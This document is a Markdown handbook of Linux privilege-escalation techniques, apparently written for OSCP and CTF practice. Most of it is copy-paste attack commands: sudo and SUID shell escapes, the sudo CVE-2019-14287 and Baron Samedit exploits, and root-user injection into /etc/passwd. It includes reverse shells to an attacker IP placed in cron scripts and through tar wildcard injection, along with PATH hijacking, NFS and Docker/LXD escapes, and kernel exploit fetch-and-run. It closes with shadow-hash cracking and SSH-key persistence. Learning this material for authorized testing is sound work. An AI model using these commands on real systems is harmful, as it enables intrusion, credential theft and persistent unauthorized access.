# 🐧 Linux Privilege Escalation Handbook

> A structured, methodology-driven reference for privilege escalation in Linux-based systems. Covers enumeration through post-exploitation across all major attack vectors.

---

## Table of Contents

1. [The Methodology](#the-methodology)
2. [Phase 1 — Enumeration](#phase-1--enumeration)
3. [Pillar 1 — Credential Access](#pillar-1--credential-access)
4. [Pillar 2 — Misconfigurations](#pillar-2--misconfigurations)
5. [Pillar 3 — Exploits](#pillar-3--exploits)
6. [File Transfer Methods](#file-transfer-methods)
7. [Post-Escalation](#post-escalation)
8. [Testing Checklist](#testing-checklist)
9. [Quick Reference](#quick-reference)

---

## The Methodology

Privilege escalation is not about running random commands — it requires a structured decision tree. The attack surface is divided into **three pillars**:

| Pillar | Description |
|--------|-------------|
| **Credential Access** | Find and reuse passwords, SSH keys, and tokens |
| **Misconfigurations** | Exploit human error in system settings (most common path) |
| **Exploits** | Kernel LPEs and vulnerable software CVEs (last resort) |

> ⚠️ PrivEsc isn't always vertical. Moving laterally to another user first is often the right move — their credentials or files may give you a shorter path to root.

### Attack Decision Flow

```
1. ENUMERATE  →  id, uname -a, sudo -l, LinPeas
2. LOW FRUIT  →  reused passwords, bash history, sudo GTFOBins
3. AUTO SCAN  →  LinPeas / LinEnum to surface anomalies fast
4. MISCONFIGS →  SUID, capabilities, cron, writable files, PATH, NFS
5. EXPLOITS   →  kernel version → searchsploit (last resort)
```

---

## Phase 1 — Enumeration

### Identity & Environment

```bash
id                          # UID, GID, groups — check for docker, lxd, disk, adm
whoami                      # username
hostname                    # machine name
cat /etc/passwd             # list all local users and shells
cat /etc/group              # list groups
```

> 💡 Group membership is gold. Being in `docker`, `lxd`, or `disk` groups typically leads to trivial root access.

### OS & Kernel Version

```bash
uname -a                    # full kernel version — note this for exploit research
cat /proc/version
cat /etc/issue
cat /etc/*release
```

### Network & Local Services

```bash
netstat -antup              # all connections and listening services
ss -tlnup                   # modern alternative
ip route                    # routing table — look for additional subnets
cat /etc/hosts
```

> 💡 Services bound to `127.0.0.1` are only reachable locally. Port-forward them via SSH: `ssh -L 8080:127.0.0.1:8080 user@target`

### Installed Languages & Compilers

```bash
which python python3 perl ruby gcc cc g++ make 2>/dev/null
find / -name "gcc" -o -name "cc" 2>/dev/null
```

> 💡 No compiler on the target? Compile on your attacker box with the same architecture and transfer the binary.

### Automated Enumeration

**LinPeas** (recommended — color-coded, most comprehensive):
```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Or transfer and run
wget http://[YOUR_IP]/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh
```

**LinEnum** (good second opinion):
```bash
wget http://[YOUR_IP]/LinEnum.sh -O /tmp/le.sh && chmod +x /tmp/le.sh && /tmp/le.sh
```

**pspy** (detect cron jobs without root):
```bash
wget http://[YOUR_IP]/pspy64 -O /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy
```

> ⚠️ Never rely solely on automated tools. LinPeas can miss context-specific vulnerabilities — always follow up with manual checks.

---

## Pillar 1 — Credential Access

> Always try credential paths first. Password reuse is extremely common and takes seconds to test.

### 1.1 Sudo Abuse

```bash
sudo -l     # list what you can run as other users — check every result on GTFOBins
```

**Common GTFOBins sudo escapes:**

| Binary | Escape |
|--------|--------|
| `nano` | `Ctrl+R` → `Ctrl+X` → type `/bin/bash` |
| `vim` / `vi` | `:!/bin/bash` |
| `find` | `sudo find / -exec /bin/bash \;` |
| `less` | Open file, type `!/bin/bash` |
| `awk` | `sudo awk 'BEGIN {system("/bin/bash")}'` |
| `env` | `sudo env /bin/sh` |
| `python3` | `sudo python3 -c 'import os; os.system("/bin/bash")'` |
| `perl` | `sudo perl -e 'exec "/bin/bash";'` |
| `nmap` (old) | Interactive mode → `!sh` |

**CVE-2019-14287** — `sudo < 1.8.28`: bypass `!root` restriction:
```bash
# If sudo -l shows (ALL, !root)
sudo -u#-1 /bin/bash
```

**CVE-2021-3156 Baron Samedit** — `sudo < 1.9.5p2` heap overflow:
```bash
# Check if vulnerable
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
# Use PoC: https://github.com/blasty/CVE-2021-3156
```

---

### 1.2 Bash History & Cleartext Credentials

```bash
cat ~/.bash_history
cat ~/.zsh_history 2>/dev/null
grep -i "pass\|pwd\|secret\|key\|token" ~/.bash_history 2>/dev/null
```

> ⚠️ People often type passwords directly into the CLI: `mysql -u root -pS3cret`, `sshpass -p`, AWS/API keys.

---

### 1.3 SSH Keys

```bash
find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
cat ~/.ssh/id_rsa 2>/dev/null
cat /root/.ssh/authorized_keys 2>/dev/null
```

**Add your public key for persistent access** (if `/root/.ssh/` is writable):
```bash
echo "[YOUR_PUB_KEY]" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

---

### 1.4 Config Files & Hardcoded Credentials

```bash
grep -r "password\|passwd\|secret\|db_pass" /var/www/ 2>/dev/null
find / -name "wp-config.php" -o -name ".env" -o -name "database.yml" 2>/dev/null
find / -name "*.conf" -o -name "*.config" -o -name "*.ini" 2>/dev/null | xargs grep -l "pass" 2>/dev/null
```

---

### 1.5 /etc/shadow — Hash Cracking

```bash
cat /etc/shadow 2>/dev/null
ls -la /etc/shadow          # check permissions

# Crack with John
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/shadow.txt

# Crack with hashcat
hashcat -m 1800 /tmp/hashes.txt /usr/share/wordlists/rockyou.txt
```

**Hash type reference:**

| Prefix | Algorithm | Hashcat mode |
|--------|-----------|-------------|
| `$1$` | MD5 | 500 |
| `$5$` | SHA-256 | 7400 |
| `$6$` | SHA-512 | 1800 |
| `$y$` | yescrypt | 7400 |

---

### 1.6 Writable /etc/passwd

```bash
ls -la /etc/passwd          # check for world-writable (w in "other" column)

# Generate password hash
openssl passwd -1 -salt hacker password123

# Append new root-equivalent user (replace HASH with output above)
echo 'hacker:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch to injected user
su hacker
```

---

## Pillar 2 — Misconfigurations

> Misconfigurations are the most common path to root. Exhaustively check every vector here before moving to exploits.

### 2.1 SUID / SGID Binaries

```bash
find / -perm -u=s -type f 2>/dev/null    # SUID
find / -perm -g=s -type f 2>/dev/null    # SGID
```

SUID binaries run as their owner (often root) regardless of who executes them. Check every non-standard result against **[GTFOBins](https://gtfobins.github.io)**.

**Common SUID attacks:**

| Binary | Attack |
|--------|--------|
| `bash` | `./bash -p` → root shell immediately |
| `find` | `./find / -exec /bin/bash -p \;` |
| `base64` | `base64 /etc/shadow \| base64 -d` → read shadow |
| `cp` | Overwrite `/etc/passwd` or add SSH key |
| `cat` / `tail` | Read `/etc/shadow`, private keys |
| `chmod` | `chmod 777 /etc/shadow` |
| `dd` | Read/write raw bytes to any file |
| `python` | `./python -c 'import os; os.execl("/bin/sh","sh","-p")'` |
| `env` | `./env /bin/bash -p` |

---

### 2.2 Cron Jobs

```bash
cat /etc/crontab
ls -la /etc/cron.* /var/spool/cron/ 2>/dev/null
crontab -l                              # current user's crontab
cat /etc/cron.d/*
```

**Use pspy to catch crons not listed in crontab:**
```bash
/tmp/pspy64
```

**Vector 1 — Writable script:**
```bash
echo "bash -i >& /dev/tcp/[YOUR_IP]/4444 0>&1" >> /path/to/cron_script.sh
```

**Vector 2 — Wildcard injection** (`tar *`, `chown *`):
```bash
# Example: cron runs "tar czf backup.tar.gz *" in /var/backups
cd /var/backups
echo "bash -i >& /dev/tcp/[YOUR_IP]/4444 0>&1" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

---

### 2.3 Linux Capabilities

```bash
getcap -r / 2>/dev/null
```

Capabilities grant specific privileges without full SUID. `cap_setuid` and `cap_dac_override` are most dangerous.

**Common capability attacks:**

| Binary + Capability | Attack |
|---------------------|--------|
| `python3 cap_setuid` | `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'` |
| `perl cap_setuid` | `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'` |
| `vim cap_fowner` | `:py3 import os; os.execl("/bin/bash","bash","-c","bash")` |
| `tar cap_dac_read_search` | Archive `/etc/shadow` and extract |
| `openssl cap_setuid` | Read any file via SSL transport |

---

### 2.4 PATH Hijacking

**When it works:** A root-owned script calls a binary using a relative name (no absolute path like `/usr/bin/id`).

```bash
# Step 1: Find what binary the root script calls
strings /path/to/root_script | grep -v "/"

# Step 2: Prepend /tmp to PATH
export PATH=/tmp:$PATH

# Step 3: Create malicious binary with that name
echo '#!/bin/bash' > /tmp/[BINARY_NAME]
echo 'chmod +s /bin/bash' >> /tmp/[BINARY_NAME]
chmod +x /tmp/[BINARY_NAME]

# Step 4: Trigger the root script, then
/bin/bash -p
```

---

### 2.5 NFS — no_root_squash

```bash
cat /etc/exports             # look for no_root_squash
showmount -e [TARGET_IP]     # run from attacker machine
```

**Exploitation (run on attacker machine as root):**
```bash
mkdir /tmp/nfs_mount
mount -t nfs [TARGET_IP]:/share /tmp/nfs_mount
cp /bin/bash /tmp/nfs_mount/bash
chmod +s /tmp/nfs_mount/bash

# On target machine
/share/bash -p               # root shell
```

> ⚠️ `no_root_squash` means root on your attacker machine acts as root on the NFS share — always check this.

---

### 2.6 Docker / LXD Group Escape

```bash
id | grep -E "docker|lxd"
```

**Docker group** — mount host filesystem:
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

**LXD group** — privileged container:
```bash
lxc init myalpine privesc -c security.privileged=true
lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
# Inside container: chroot /mnt/root /bin/bash → root on host FS
```

---

### 2.7 World-Writable Files & Directories

```bash
find / -writable -type d 2>/dev/null        # writable directories
find / -writable -type f 2>/dev/null        # writable files
find / -writable -type f -not -path "/proc/*" 2>/dev/null
```

Pay close attention to writable entries in `/etc/`, `/usr/`, or anywhere in system paths.

---

## Pillar 3 — Exploits

> ⚠️ Use exploits as a last resort. Kernel exploits can crash the system, cause data loss, or trigger IDS alerts. Always get a stable shell first and exhaust all other options.

### 3.1 Kernel Exploits

```bash
uname -a                                                    # get kernel version
searchsploit linux kernel [VERSION] local privilege escalation
searchsploit -m [EXPLOIT_ID]                                # copy exploit to current dir
```

**Exploitation workflow:**
```bash
# Transfer source to target
wget http://[YOUR_IP]/exploit.c -O /tmp/exploit.c

# Compile (or compile on attacker box and transfer binary)
gcc exploit.c -o /tmp/exploit

# Run
chmod +x /tmp/exploit && /tmp/exploit
```

**Notable kernel CVEs:**

| CVE | Name | Affected kernel | Impact |
|-----|------|----------------|--------|
| CVE-2016-5195 | Dirty COW | < 4.8.3 | Root |
| CVE-2022-0847 | Dirty Pipe | 5.8 – 5.16.11 | Root |
| CVE-2021-4034 | PwnKit | All (pkexec) | Root |
| CVE-2021-3156 | Baron Samedit | sudo < 1.9.5p2 | Root |
| CVE-2019-14287 | Sudo bypass | sudo < 1.8.28 | Root |
| CVE-2023-0386 | OverlayFS | 5.11 – 6.2 | Root |
| CVE-2019-13272 | PTRACE_TRACEME | < 5.1.17 | Root |

---

### 3.2 Vulnerable Software (Non-Kernel)

```bash
sudo --version
dpkg -l 2>/dev/null | grep -E "tmux|screen|vim|nano|sudo"
rpm -qa 2>/dev/null | head -50
```

**CVE-2021-4034 PwnKit** — all major distros, `pkexec` before Jan 2022:
```bash
pkexec --version
# PoC: https://github.com/berdav/CVE-2021-4034
```

---

## File Transfer Methods

### Attacker → Target

```bash
# Python HTTP server on attacker
python3 -m http.server 8080

# Pull on target
wget http://[YOUR_IP]:8080/file -O /tmp/file
curl http://[YOUR_IP]:8080/file -o /tmp/file
```

```bash
# SCP
scp exploit.c user@target:/tmp/
```

```bash
# Base64 encode/decode (no network needed)
# On attacker:
cat exploit.c | base64 -w 0

# On target (paste the output):
echo "[BASE64_STRING]" | base64 -d > /tmp/exploit.c
```

### Netcat

```bash
# Attacker (listen)
nc -lvnp 9999 < exploit.c

# Target (receive)
nc [YOUR_IP] 9999 > /tmp/exploit.c
```

---

## Post-Escalation

```bash
id && whoami                            # verify you are root
cat /root/flag.txt                      # grab the flag
find /root -name "*.txt" 2>/dev/null

cat /etc/shadow                         # dump hashes for all users
unshadow /etc/passwd /etc/shadow > /tmp/unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/unshadowed.txt

ip route                                # look for additional subnets (pivoting)
cat /etc/hosts                          # internal hostnames

# Add SSH key for persistence
mkdir -p /root/.ssh
echo "[YOUR_PUB_KEY]" >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys
```

> 📝 Document the exact PrivEsc path taken — you'll need it for your report or write-up.

---

## Testing Checklist

Use this checklist for every target. Work top to bottom — don't jump to exploits before exhausting misconfigs.

### Phase 1 — Enumeration
- [ ] Run `id`, `whoami`, `hostname`
- [ ] Get kernel version: `uname -a`
- [ ] Get OS/distro: `cat /etc/issue` and `cat /etc/*release`
- [ ] Check group memberships — look for `docker`, `lxd`, `disk`, `adm`
- [ ] Run LinPeas and review color-coded output
- [ ] Enumerate local services: `netstat -antup` or `ss -tlnup`
- [ ] Check available compilers and scripting languages

### Phase 2 — Credential Access
- [ ] Run `sudo -l` — check every binary on GTFOBins
- [ ] Try current password on `su root` and other users
- [ ] Check `~/.bash_history` and `~/.zsh_history` for cleartext creds
- [ ] Search for SSH private keys in home dirs and `/root/.ssh/`
- [ ] Check readability of `/etc/shadow`
- [ ] Search web app files for hardcoded DB credentials
- [ ] Check `/etc/passwd` for write permissions

### Phase 3 — Misconfigurations
- [ ] SUID: `find / -perm -u=s -type f 2>/dev/null` → GTFOBins
- [ ] SGID: `find / -perm -g=s -type f 2>/dev/null`
- [ ] Capabilities: `getcap -r / 2>/dev/null`
- [ ] Cron: `cat /etc/crontab` + run pspy
- [ ] Check cron scripts for writability and wildcard injection
- [ ] PATH hijacking — check if root scripts use relative binary names
- [ ] NFS: `cat /etc/exports` for `no_root_squash`
- [ ] Check if user is in `docker` or `lxd` group
- [ ] World-writable dirs: `find / -writable -type d 2>/dev/null`

### Phase 4 — Exploits (last resort)
- [ ] Research kernel version with `searchsploit`
- [ ] Check sudo version for CVE-2021-3156 and CVE-2019-14287
- [ ] Check `pkexec` for CVE-2021-4034 (PwnKit)
- [ ] Check kernel range for CVE-2022-0847 (Dirty Pipe): 5.8–5.16.11
- [ ] Verify exploit compatibility with target arch before running

### Phase 5 — Post-Escalation
- [ ] Verify root: `id && whoami`
- [ ] Grab root flag
- [ ] Dump and crack `/etc/shadow` hashes
- [ ] Enumerate additional subnets for pivoting
- [ ] Document the full PrivEsc path

---

## Quick Reference

### Useful One-Liners

```bash
# Find all writable files not owned by you
find / -writable ! -user $(whoami) -type f 2>/dev/null

# Find recently modified files
find / -mmin -10 -type f 2>/dev/null

# Find files owned by root but world-readable
find / -user root -readable -type f 2>/dev/null | grep -v proc

# Spawn interactive shell from limited shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
script /dev/null -c bash
```

### Essential Resources

| Resource | URL |
|----------|-----|
| GTFOBins | https://gtfobins.github.io |
| Exploit-DB | https://www.exploit-db.com |
| LinPeas | https://github.com/carlospolop/PEASS-ng |
| pspy | https://github.com/DominicBreuker/pspy |

---

## General References

| Resource | URL |
|----------|-----|
| TryHackMe: Linux Privilege Escalation Walkthrough | https://tryhackme.com/room/linprivesc |
| Motasem Hamdan: YT THM Walkthrough | https://www.youtube.com/watch?v=7WQndt-1WzE&vl=en |
| Conda: OSCP Methodology | https://www.youtube.com/watch?v=VpNaPAh93vE |

---

*Handbook covers OSCP methodology, HTB, and real-world pentesting. Always operate within scope and with proper authorization.*
